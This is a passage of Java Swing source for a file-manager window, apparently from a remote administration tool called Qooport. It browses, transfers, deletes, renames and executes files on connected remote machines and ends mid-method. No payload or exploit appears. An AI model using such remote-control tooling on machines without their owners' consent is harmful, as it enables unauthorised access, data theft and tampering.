package qooport.modulos.archivos;

import comunes.Accion;
import comunes.Archivo;
import comunes.CampoIcono;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.Image;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.dnd.DnDConstants;
import java.awt.dnd.DropTarget;
import java.awt.dnd.DropTargetDropEvent;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import javax.swing.BorderFactory;
import javax.swing.Box;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.JToggleButton;
import javax.swing.JToolBar;
import javax.swing.ListCellRenderer;
import static javax.swing.SwingConstants.CENTER;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import qooport.asociado.Asociado;
import qooport.avanzado.QoopoRT;
import static qooport.avanzado.QoopoRT.tipoLetra;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.Protocolo;
import qooport.utilidades.Util;

public class AdminArchivos extends JFrame
        implements WindowListener {

    private JTabbedPane tab;
    public JToolBar barraLocalUnidad;
    public JToolBar barraLocalRuta;
    public JToolBar barraRemotaUnidad;
    public JToolBar barraRemotaRuta;
    public JToolBar barraLocalAcciones;
    public JToolBar barraRemotaAcciones;
    public String sep = "/";
    public boolean conectado;
    private JButton btnActDrivesRemoto;
    private JButton btnListarRemoto;
    private JButton btnActDrivesLocal;
    private JButton btnListarLocal;
    private JButton btnActualizarLocal;
    private JButton btnActualizarRemoto;
    private JButton btnEliminarLocal;
    private JButton btnEliminarRemoto;
    private JButton btnHomeLocal;
    private JButton btnHomeRemoto;
    private JButton btnDirDescargas;
    private JButton btnSubirDirectorioRemoto;
    private JButton btnNuevaCarpetaLocal;
    private JButton btnNuevaCarpetaRemota;
    private JButton btnBuscarRemoto;
    private JTable tablaLocal;
    private JTable tablaRemota;
    private JTable tablaResultados;
    private JComboBox unidadRemota;
    private JComboBox unidadLocal;
    private DefaultTableModel modeloTablaLocal;
    private DefaultTableModel modeloTablaRemota;
    private DefaultTableModel modelotablaResultados;
    private JScrollPane scrollTablaLocal;
    private JScrollPane scrollTablaRemota;
    private JScrollPane scrollTablaResultado;
    private JTextField txtRutaRemota;
    private JTextField txtRutaLocal;
    private JPanel contenedorPrincipal;
    private JPopupMenu menuPanelRemoto;
    private JPopupMenu menu2;
    private JMenuItem itmDescargarIzquierda;
    private JMenuItem itmDescargar;
    private JMenuItem itmSubir;
    private JMenuItem itmComprimir;
    private JMenuItem itmRenombrar;
    private JMenuItem itmCopiar;
    private JMenuItem itmCortar;
    private JMenuItem itmPegar;
    private JMenuItem itmEliminarRemoto;
    private JMenuItem itmCrearCarpeta;
    private JMenuItem itmEjecutar;
    private JMenuItem descarga2;
    private JMenuItem itmEliminar2;
    private JMenuItem itmEjecutar2;
    private Asociado servidor;
    private String rutaPosteriorLocal = "";
    private String rutaPosterior = "";
    private String seleccionado;
    private String seleccionadoLocal;
    private ImageIcon[] unidadesRemotas;
    private ImageIcon[] unidadesLocales;
    private JPanel panelInfoRemoto;
    private JPanel panelInfoLocal;
    private JLabel vistaPreviaRemoto;
    private JLabel vistaPreviaLocal;
    private JLabel lblCriterio;
    private JLabel lblLugar;
    private JLabel lblInfoNombreLocal;
    private JLabel lblInfoTipoLocal;
    private JLabel lblInfoFechaLocal;
    private JLabel lblInfoTamanioLocal;
    private JLabel lblInfoNombreRemoto;
    private JLabel lblInfoTipoRemoto;
    private JLabel lblInfoFechaRemoto;
    private JLabel lblInfoTamanioRemoto;
    private JTextField criterioBusqueda;
    private JTextField lugarBusqueda;
    private JToggleButton btnBuscar;
    private JButton btnLimpiarBusqueda;
    private JButton btnDescargar;
    private JButton btnSubir;
    private JPanel panelLocal;
    private JPanel panelRemoto;

    //usada para copiar y pegar (solo archivo no carpetas)
    private List<String> archivosACopiar = new ArrayList<>();
    private int tipoAccionPortapaleles;
    public static final int COPIAR = 1;
    public static final int CORTAR = 2;

    private final Accion accionListarLocal = new Accion() {
        @Override
        public void ejecutar(Object... parametros) {
            AdminArchivos.this.btnListarLocalAP(null);
        }
    };
    //accion de listar remotamente para cuadno se completa la trasnferencia de archivos
    private final Accion accionListarRemoto = new Accion() {
        @Override
        public void ejecutar(Object... parametros) {
            AdminArchivos.this.btnListarAP(null);
        }
    };

    public AdminArchivos(Asociado servidor) {
        initComponents();
        this.tablaLocal.getColumnModel().getColumn(0).setCellRenderer(new CeldaIcono());
        this.tablaLocal.getColumnModel().getColumn(2).setCellRenderer(new CeldaTamanio());
        this.tablaRemota.getColumnModel().getColumn(0).setCellRenderer(new CeldaIcono());
        this.tablaRemota.getColumnModel().getColumn(2).setCellRenderer(new CeldaTamanio());
//        this.tablaRemota.getColumnModel().getColumn(4).setCellRenderer(new CeldaTamanio());
//        this.tablaRemota.getColumnModel().getColumn(5).setCellRenderer(new CeldaTamanio());
//        this.tablaRemota.getColumnModel().getColumn(6).setCellRenderer(new CeldaTamanio());

        this.tablaResultados.getColumnModel().getColumn(0).setCellRenderer(new CeldaIcono());
        this.tablaResultados.getColumnModel().getColumn(2).setCellRenderer(new CeldaTamanio());
        this.modeloTablaLocal = ((DefaultTableModel) this.tablaLocal.getModel());
        this.modeloTablaRemota = ((DefaultTableModel) this.tablaRemota.getModel());
        modelotablaResultados = ((DefaultTableModel) this.tablaResultados.getModel());
        this.servidor = servidor;
        this.btnListarDrivesLocalAP(null);
    }

    private void initComponents() {
        JPanel panelArchivos = new JPanel();
        barraRemotaUnidad = new JToolBar();
        barraRemotaUnidad.setFloatable(false);

        barraRemotaRuta = new JToolBar();
        barraRemotaRuta.setFloatable(false);

        barraLocalUnidad = new JToolBar();
        barraLocalUnidad.setFloatable(false);
        barraLocalRuta = new JToolBar();
        barraLocalRuta.setFloatable(false);

        barraLocalAcciones = new JToolBar();
        barraLocalAcciones.setFloatable(false);
        barraRemotaAcciones = new JToolBar();
        barraRemotaAcciones.setFloatable(false);
        this.btnActDrivesRemoto = new JButton();
        this.btnActDrivesLocal = new JButton();
        this.btnListarRemoto = new JButton();
        this.btnListarLocal = new JButton();
        btnActualizarLocal = new JButton();
        btnActualizarRemoto = new JButton();
        btnEliminarLocal = new JButton();
        btnEliminarRemoto = new JButton();
        btnNuevaCarpetaLocal = new JButton();
        btnNuevaCarpetaRemota = new JButton();
        btnHomeLocal = new JButton();
        btnDirDescargas = new JButton();
        btnHomeRemoto = new JButton();
        btnSubirDirectorioRemoto = new JButton();
        btnBuscarRemoto = new JButton();
        this.scrollTablaRemota = new JScrollPane();
        scrollTablaLocal = new JScrollPane();
        scrollTablaResultado = new JScrollPane();
        this.unidadRemota = new JComboBox();
        this.unidadLocal = new JComboBox();
        this.menuPanelRemoto = new JPopupMenu();
        this.menu2 = new JPopupMenu();
        itmDescargar = new JMenuItem();
        itmDescargarIzquierda = new JMenuItem();
        itmComprimir = new JMenuItem();
        itmRenombrar = new JMenuItem();
        itmCopiar = new JMenuItem();
        itmCortar = new JMenuItem();
        itmPegar = new JMenuItem();
        itmSubir = new JMenuItem();
        itmEliminarRemoto = new JMenuItem();
        itmCrearCarpeta = new JMenuItem();
        itmEjecutar = new JMenuItem();
        descarga2 = new JMenuItem();
        itmEliminar2 = new JMenuItem();
        itmEjecutar2 = new JMenuItem();

        setResizable(true);
        try {
            setTitle("Administrador de Archivos [" + servidor.getInformacion() + "]");
        } catch (Exception e) {
            setTitle("Administrador de Archivos");
        }

        componentesLocal();

        componentesRemoto();

        contenedorPrincipal = new JPanel();
        contenedorPrincipal.setLayout(new GridLayout(1, 2));
        contenedorPrincipal.add(panelLocal);
        contenedorPrincipal.add(panelRemoto);
        panelArchivos.setLayout(new BorderLayout());
        panelArchivos.add(contenedorPrincipal, BorderLayout.CENTER);
//        panelArchivos.add(panelInfo, BorderLayout.WEST);

        //----------------------------------------------------------------------------------------------
        //ARMAR LA VENTANA
        tab = new JTabbedPane();
        this.tab.addTab("Archivos", Util.cargarIcono16("/resources/folder.png"), panelArchivos);
        this.tab.addTab("Buscar archivos", Util.cargarIcono16("/resources/search.png"), panelBusqueda());
        this.setLayout(new BorderLayout());
        this.add(tab, BorderLayout.CENTER);
//        this.setLayout(new BorderLayout());
//        this.add(barraRemotaUnidad, BorderLayout.NORTH);
//        this.add(contenedorPrincipal, BorderLayout.CENTER);
        JPanel panelInferior = new JPanel();
        panelInferior.setLayout(new GridLayout(1, 2));
        panelInferior.add(panelInfoLocal);
        panelInferior.add(panelInfoRemoto);

        //this.add(panelInfo, BorderLayout.SOUTH);
        this.add(panelInferior, BorderLayout.SOUTH);
        this.setSize(600, 600);
//        this.setResizable(true);
        this.setVisible(true);
        this.setIconImage(Util.cargarIcono16("/resources/folder.png").getImage());

        //accion de listar localmente para cuadno se completa la trasnferencia de archivos
        QoopoRT.agregarAccionCarga(accionListarRemoto);
        QoopoRT.agregarAccionDescarga(accionListarLocal);

        pack();
    }

    private void componentesLocal() {
        panelLocal = new JPanel();

        btnActDrivesLocal.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        this.btnActDrivesLocal.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnListarDrivesLocalAP(evt);
            }
        });
        this.unidadLocal.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.unidadLocalAP(evt);
            }
        });
        ComboBoxLocalRenderer rendererLocal = new ComboBoxLocalRenderer();
        unidadLocal.setRenderer(rendererLocal);

        this.btnListarLocal.setText("Listar");
        btnListarLocal.setIcon(Util.cargarIcono16("/resources/refresh_blue.png"));
        this.btnListarLocal.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnListarLocalAP(evt);
            }
        });
        btnActualizarLocal.setIcon(Util.cargarIcono16("/resources/refresh_blue.png"));
        this.btnActualizarLocal.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnListarLocalAP(evt);
            }
        });

        this.btnEliminarLocal.setIcon(Util.cargarIcono16("/resources/delete.png"));
        this.btnEliminarLocal.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.eliminarLocalActionPerformed(evt);
            }
        });

        this.itmCrearCarpeta.setText("Crear Carpeta");
        this.itmCrearCarpeta.setIcon(Util.cargarIcono16("/resources/folder_plus.png"));
        this.itmCrearCarpeta.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.crearCarpetaActionPerformed(evt);
            }
        });

        this.btnNuevaCarpetaLocal.setIcon(Util.cargarIcono16("/resources/folder_plus.png"));
        btnNuevaCarpetaLocal.setToolTipText("Crear carpeta");
        this.btnNuevaCarpetaLocal.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.crearCarpetaLocalActionPerformed(evt);
            }
        });

        this.btnHomeLocal.setIcon(Util.cargarIcono16("/resources/home.png"));
        btnHomeLocal.setToolTipText("Home");
        this.btnHomeLocal.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.listarLocal(System.getProperty("user.home"));
            }
        });

        this.btnDirDescargas.setIcon(Util.cargarIcono16("/resources/folder-download.png"));
        btnDirDescargas.setToolTipText("Directorio de descarga");
        this.btnDirDescargas.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                //AdminArchivos.this.listarLocal(new File("equipos").getAbsolutePath());
                AdminArchivos.this.listarLocal(AdminArchivos.this.servidor.getdDescargas().getAbsolutePath());
            }
        });

        tablaLocal = new JTable();
        tablaLocal.setShowGrid(false);
//        this.tablaLocal.setComponentPopupMenu(this.menu);
        this.tablaLocal.setAutoCreateRowSorter(true);
        this.tablaLocal.setFont(new Font(tipoLetra, 1, 14));
//         this.tablaRemota.setRowHeight(100);
        this.tablaLocal.setModel(new DefaultTableModel(new Object[0][], new String[]{"Nombre", "Tipo", "Tamaño", "Modificado"}) {
            boolean[] canEdit = {false, false, false, false};

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });
        this.tablaLocal.addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent evt) {
                AdminArchivos.this.tablaLocalMouseClick(evt);
            }

            public void mousePressed(MouseEvent evt) {
                AdminArchivos.this.tablaLocalMousePressed(evt);
            }
        });

        DropTarget dropDescargar = new DropTarget() {
            @Override
            public synchronized void drop(DropTargetDropEvent dtde) {
                try {
                    dtde.acceptDrop(DnDConstants.ACTION_COPY_OR_MOVE);
                    Transferable t = dtde.getTransferable();
                    if (t.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                        String contenido = (String) t.getTransferData(DataFlavor.stringFlavor);
                        if (contenido.contains("CampoIcono{")) {
                            //si es del tipo de mis tablas
                            String[] lista = contenido.split("\n");
//                            System.out.println("tamanio lista=" + lista.length);
                            for (String st : lista) {
//                                System.out.println("Valor:" + st);
                                String[] campos = st.split("\t");
                                //CampoIcono{201nombre=sinso2-1.jpg}	jpg	40823	2016/10/18 12:24:21
                                int icar1 = campos[0].indexOf("=");
                                String nombre = campos[0].substring(icar1 + 1, campos[0].length() - 1);
                                rutaPosterior = (txtRutaRemota.getText() + sep + nombre);
                                servidor.descargar(rutaPosterior, txtRutaLocal.getText());
                            }
                        } else {
                            System.out.println("es de tipo string pero no es de mi tipo");
                        }
                    }

                } catch (UnsupportedFlavorException ex) {

                } catch (IOException ex) {

                }

                try {
                    super.drop(dtde);
                } catch (Exception e) {
                }
            }
        };

        tablaLocal.setDragEnabled(true);//permite arrastrar desde aqui a otro lugar
        tablaLocal.setDropTarget(dropDescargar);//permite ser destino de un arrastre
        scrollTablaLocal.setDropTarget(dropDescargar);

//        this.tablaLocal.getColumnModel().getColumn(0).setMinWidth(20);
//        this.tablaLocal.getColumnModel().getColumn(0).setPreferredWidth(20);
//        this.tablaLocal.getColumnModel().getColumn(0).setMaxWidth(20);
        this.scrollTablaLocal.setViewportView(this.tablaLocal);

        btnDescargar = new JButton();
        btnDescargar.setSize(32, 16);
        btnDescargar.setIcon(Util.cargarIcono16("/resources/2leftarrow.png"));
        this.btnDescargar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnDescargaActionPerformed(evt);
            }
        });
        btnSubir = new JButton();
        btnSubir.setSize(32, 16);
        btnSubir.setIcon(Util.cargarIcono16("/resources/2rightarrow.png"));
        this.btnSubir.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.bntSubirActionPerformed(evt);
            }
        });

        txtRutaLocal = new JTextField();
        txtRutaLocal.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnListarLocalAP(evt);
            }
        });
        barraLocalUnidad.add(unidadLocal);
        barraLocalUnidad.add(btnActDrivesLocal);
        //barraLocalUnidad.addSeparator();
        barraLocalRuta.add(txtRutaLocal);
        barraLocalRuta.add(btnListarLocal);
        barraLocalAcciones.add(btnActualizarLocal);
        barraLocalAcciones.add(btnEliminarLocal);
        barraLocalAcciones.add(btnNuevaCarpetaLocal);
        barraLocalAcciones.add(btnHomeLocal);
        barraLocalAcciones.add(btnDirDescargas);
        barraLocalAcciones.add(Box.createHorizontalGlue());
        barraLocalAcciones.add(btnSubir);

        vistaPreviaLocal = new JLabel();
        vistaPreviaLocal.setIcon(Util.cargarIcono("/resources/nodisponible.png"));

        JPanel panelInfoArchivolLocal = new JPanel();
        panelInfoArchivolLocal.setLayout(new GridLayout(4, 2));
        panelInfoArchivolLocal.add(GuiUtil.crearJLabel("Nombre:", "Nombre del archivo"));

        lblInfoNombreLocal = GuiUtil.crearJLabel("--", "--");
        panelInfoArchivolLocal.add(lblInfoNombreLocal);
        panelInfoArchivolLocal.add(GuiUtil.crearJLabel("Tipo:", "Tipo del archivo"));
        lblInfoTipoLocal = GuiUtil.crearJLabel("--", "--");
        panelInfoArchivolLocal.add(lblInfoTipoLocal);
        panelInfoArchivolLocal.add(GuiUtil.crearJLabel("Tamaño:", "Tamaño del archivo"));
        lblInfoTamanioLocal = GuiUtil.crearJLabel("--", "--");
        panelInfoArchivolLocal.add(lblInfoTamanioLocal);
        panelInfoArchivolLocal.add(GuiUtil.crearJLabel("Fecha:", "Fecha de modificación del archivo"));
        lblInfoFechaLocal = GuiUtil.crearJLabel("--", "--");
        panelInfoArchivolLocal.add(lblInfoFechaLocal);

        panelInfoLocal = new JPanel();
        panelInfoLocal.setLayout(new BorderLayout());
        panelInfoLocal.add(vistaPreviaLocal, BorderLayout.WEST);
        panelInfoLocal.add(panelInfoArchivolLocal, BorderLayout.CENTER);

        this.panelInfoLocal.setBorder(BorderFactory.createTitledBorder(null, "Información", 0, 0, new Font(tipoLetra, 1, 12), new Color(0, 102, 51)));

        JPanel barrasLocales = new JPanel();
        barrasLocales.setLayout(new BorderLayout());
        barrasLocales.add(barraLocalUnidad, BorderLayout.NORTH);
        barrasLocales.add(barraLocalRuta, BorderLayout.CENTER);
        barrasLocales.add(barraLocalAcciones, BorderLayout.SOUTH);
        panelLocal.setLayout(new BorderLayout());
        panelLocal.add(barrasLocales, BorderLayout.NORTH);
        panelLocal.add(scrollTablaLocal, BorderLayout.CENTER);
    }

    private void componentesRemoto() {

        panelRemoto = new JPanel();

        btnActDrivesRemoto.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        this.btnActDrivesRemoto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnListarDrivesAP(evt);
            }
        });
        this.unidadRemota.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.unidadAP(evt);
            }
        });
        ComboBoxRemotoRenderer renderer = new ComboBoxRemotoRenderer();
        unidadRemota.setRenderer(renderer);

        this.btnListarRemoto.setText("Listar");
        btnListarRemoto.setIcon(Util.cargarIcono16("/resources/refresh_blue.png"));
        this.btnListarRemoto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnListarAP(evt);
            }
        });
        btnActualizarRemoto.setIcon(Util.cargarIcono16("/resources/refresh_blue.png"));
        this.btnActualizarRemoto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnListarAP(evt);
            }
        });

        this.itmComprimir.setText("Comprimir");
        this.itmComprimir.setIcon(Util.cargarIcono16("/resources/compress.png"));
        this.itmComprimir.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.comprimirActionPerformed(evt);
            }
        });

        this.itmRenombrar.setText("Renombrar");
        this.itmRenombrar.setIcon(Util.cargarIcono16("/resources/rename.png"));
        this.itmRenombrar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.renombrararchivoAP(evt);
            }
        });

        this.itmCopiar.setText("Copiar");
        this.itmCopiar.setIcon(Util.cargarIcono16("/resources/copiar.png"));
        this.itmCopiar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.copiarAP(evt);
            }
        });
        this.itmCortar.setText("Cortar");
        this.itmCortar.setIcon(Util.cargarIcono16("/resources/cortar.png"));
        this.itmCortar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.cortarAP(evt);
            }
        });

        this.itmPegar.setText("Pegar");
        this.itmPegar.setIcon(Util.cargarIcono16("/resources/pegar.png"));
        this.itmPegar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.pegarAP(evt);
            }
        });

        this.itmDescargarIzquierda.setText("Descargar");
        this.itmDescargarIzquierda.setToolTipText("Descarga en la carpeta local actual del panel izquierdo");
        this.itmDescargarIzquierda.setIcon(Util.cargarIcono16("/resources/2leftarrow.png"));
        this.itmDescargarIzquierda.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnDescargaActionPerformed(evt);
            }
        });

        this.itmDescargar.setText("Descargar (Carpeta servidores)");
        this.itmDescargar.setToolTipText("Descarga en la carpeta <<Descargas>> de la carpeta de los servidores conectados");
        this.itmDescargar.setIcon(Util.cargarIcono16("/resources/down_arrow.png"));
        this.itmDescargar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.descargaActionPerformed(evt);
            }
        });
        this.itmSubir.setText("Subir");
        this.itmSubir.setIcon(Util.cargarIcono16("/resources/up_arrow.png"));
        this.itmSubir.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.subirActionPerformed(evt);
            }
        });

        this.itmEliminarRemoto.setText("Eliminar");
        this.itmEliminarRemoto.setIcon(Util.cargarIcono16("/resources/delete.png"));
        this.itmEliminarRemoto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.eliminarActionPerformed(evt);
            }
        });

        this.btnEliminarRemoto.setIcon(Util.cargarIcono16("/resources/delete.png"));
        this.btnEliminarRemoto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.eliminarActionPerformed(evt);
            }
        });

        this.btnNuevaCarpetaRemota.setIcon(Util.cargarIcono16("/resources/folder_plus.png"));
        btnNuevaCarpetaRemota.setToolTipText("Crear carpeta");
        this.btnNuevaCarpetaRemota.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.crearCarpetaActionPerformed(evt);
            }
        });

        this.itmEjecutar.setText("Ejecutar/Abrir");
        this.itmEjecutar.setIcon(Util.cargarIcono16("/resources/runcmd.png"));
        this.itmEjecutar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.ejecutarActionPerformed(evt);
            }
        });

        this.menuPanelRemoto.add(this.itmDescargarIzquierda);
        this.menuPanelRemoto.addSeparator();
        this.menuPanelRemoto.add(this.itmDescargar);
        this.menuPanelRemoto.add(this.itmSubir);

        this.menuPanelRemoto.add(itmCopiar);
        this.menuPanelRemoto.add(itmCortar);
        this.menuPanelRemoto.add(itmPegar);

        this.menuPanelRemoto.add(this.itmEliminarRemoto);
        this.menuPanelRemoto.add(this.itmCrearCarpeta);
        this.menuPanelRemoto.add(this.itmEjecutar);
        this.menuPanelRemoto.add(this.itmComprimir);

        this.menuPanelRemoto.add(itmRenombrar);

        this.descarga2.setText("Descargar");
        this.descarga2.setIcon(Util.cargarIcono16("/resources/down_arrow.png"));
        this.descarga2.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.descargaTablaResultadoActionPerformed(evt);
            }
        });
        this.itmEliminar2.setText("Eliminar");
        this.itmEliminar2.setIcon(Util.cargarIcono16("/resources/delete.png"));
        this.itmEliminar2.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.eliminar2ActionPerformed(evt);
            }
        });
        this.itmEjecutar2.setText("Ejecutar/Abrir");
        this.itmEjecutar2.setIcon(Util.cargarIcono16("/resources/runcmd.png"));
        this.itmEjecutar2.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.ejecutar2ActionPerformed(evt);
            }
        });
        this.menu2.add(this.descarga2);
        this.menu2.add(this.itmEliminar2);
        this.menu2.add(this.itmEjecutar2);

        this.btnHomeRemoto.setIcon(Util.cargarIcono16("/resources/home.png"));
        btnHomeRemoto.setToolTipText("Home");
        this.btnHomeRemoto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.listarHomeRemoto(evt);
            }
        });

        this.btnSubirDirectorioRemoto.setIcon(Util.cargarIcono16("/resources/up_arrow.png"));
        btnSubirDirectorioRemoto.setToolTipText("Subir Directorio");
        this.btnSubirDirectorioRemoto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
//                AdminArchivos.this.listarHomeRemoto(evt);

                seleccionado = "..";
                if ((!txtRutaRemota.getText().contains("/")) && (txtRutaRemota.getText().isEmpty())) {
                    rutaPosterior = (txtRutaRemota.getText() + seleccionado);
                } else {
                    rutaPosterior = (txtRutaRemota.getText() + sep + seleccionado);
                }
                limpiaTablaRemota();
                modeloTablaRemota.addRow(new Object[]{new CampoIcono(Util.obtenerBytes(Util.cargarIcono16("/resources/up_arrow.png")), "..")});
                txtRutaRemota.setText(rutaPosterior);
                servidor.listar(rutaPosterior);

            }
        });

        this.btnBuscarRemoto.setIcon(Util.cargarIcono16("/resources/search.png"));
        btnBuscarRemoto.setToolTipText("Home");
        this.btnBuscarRemoto.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                lugarBusqueda.setText(txtRutaRemota.getText());
            }
        });

        tablaRemota = new JTable();
        tablaRemota.setShowGrid(false);

        DropTarget dropSubir = new DropTarget() {
            @Override
            public synchronized void drop(DropTargetDropEvent dtde) {

                //codigo de ejemplo para tomar el nombre de los archivo y ponerlos en la tabla
//                Point point = dtde.getLocation();
//                int column = tablaRemota.columnAtPoint(point);
//                int row = tablaRemota.rowAtPoint(point);
//                try {
//                    dtde.acceptDrop(DnDConstants.ACTION_COPY_OR_MOVE);
//                    Transferable t = dtde.getTransferable();
//                    List fileList = (List) t.getTransferData(DataFlavor.javaFileListFlavor);
//                    File f = (File) fileList.get(0);
//                    tablaRemota.setValueAt(f.getAbsolutePath(), row, column);
//                    tablaRemota.setValueAt(f.length(), row, column + 1);
//                } catch (UnsupportedFlavorException ex) {
//
//                } catch (IOException ex) {
//
//                }
// lo que vamso a hacer es mandar la orden de ADMIN_ARCHIVOS_SUBIR los archivos seleccionados
                try {
                    dtde.acceptDrop(DnDConstants.ACTION_COPY_OR_MOVE);
                    Transferable t = dtde.getTransferable();
                    //si es una lista de archivos
                    if (t.isDataFlavorSupported(DataFlavor.javaFileListFlavor)) {
                        List<File> fileList = (List<File>) t.getTransferData(DataFlavor.javaFileListFlavor);
                        for (File f : fileList) {
                            servidor.subirArchivo(f.getAbsolutePath(), txtRutaRemota.getText());
                        }
                    } else if (t.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                        String contenido = (String) t.getTransferData(DataFlavor.stringFlavor);
                        if (contenido.contains("CampoIcono{")) {
                            //si es del tipo de mis tablas
                            String[] lista = contenido.split("\n");
//                            System.out.println("tamanio lista=" + lista.length);
                            for (String st : lista) {
//                                System.out.println("Valor:" + st);
                                String[] campos = st.split("\t");
                                //CampoIcono{201nombre=sinso2-1.jpg}	jpg	40823	2016/10/18 12:24:21
                                int icar1 = campos[0].indexOf("=");
                                String nombre = campos[0].substring(icar1 + 1, campos[0].length() - 1);
                                rutaPosteriorLocal = (txtRutaLocal.getText() + sep + nombre);
                                servidor.subirArchivo(rutaPosteriorLocal, txtRutaRemota.getText());
                            }
                        } else {
                            System.out.println("es de tipo string pero no es de mi tipo");
                        }
                    }
                } catch (UnsupportedFlavorException ex) {

                } catch (IOException ex) {

                }

                try {
                    super.drop(dtde);
                } catch (Exception e) {
                }
            }
        };

        tablaRemota.setDropTarget(dropSubir); // para poder ser destino de arrastre
        tablaRemota.setDragEnabled(true);// para poder arrastrar desde aqui

        this.tablaRemota.setComponentPopupMenu(this.menuPanelRemoto);
        this.tablaRemota.setAutoCreateRowSorter(true);
        this.tablaRemota.setFont(new Font(tipoLetra, 1, 14));
//         this.tablaRemota.setRowHeight(100);
        this.tablaRemota.setModel(new DefaultTableModel(new Object[0][], new String[]{"Nombre", "Tipo", "Tamaño", "Modificado"}) {
            boolean[] canEdit = {false, false, false, false};

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });
        this.tablaRemota.addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent evt) {
                AdminArchivos.this.tablaRemotaMouseClick(evt);
            }

            public void mousePressed(MouseEvent evt) {
                AdminArchivos.this.tablaRemotaMousePressed(evt);
            }
        });
//        this.tablaRemota.getColumnModel().getColumn(0).setMinWidth(20);
//        this.tablaRemota.getColumnModel().getColumn(0).setPreferredWidth(20);
//        this.tablaRemota.getColumnModel().getColumn(0).setMaxWidth(20);
        this.scrollTablaRemota.setViewportView(this.tablaRemota);
        scrollTablaRemota.setDropTarget(dropSubir); // para poder ser destino de arrastre

        txtRutaRemota = new JTextField();
        txtRutaRemota.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnListarAP(evt);
            }
        });

        barraRemotaUnidad.add(unidadRemota);
        barraRemotaUnidad.add(btnActDrivesRemoto);

        barraRemotaRuta.add(txtRutaRemota);
        barraRemotaRuta.add(btnListarRemoto);
        barraRemotaAcciones.add(btnDescargar);
        barraRemotaAcciones.add(Box.createHorizontalGlue());
        barraRemotaAcciones.add(btnBuscarRemoto);
        barraRemotaAcciones.add(btnSubirDirectorioRemoto);
        barraRemotaAcciones.add(btnHomeRemoto);
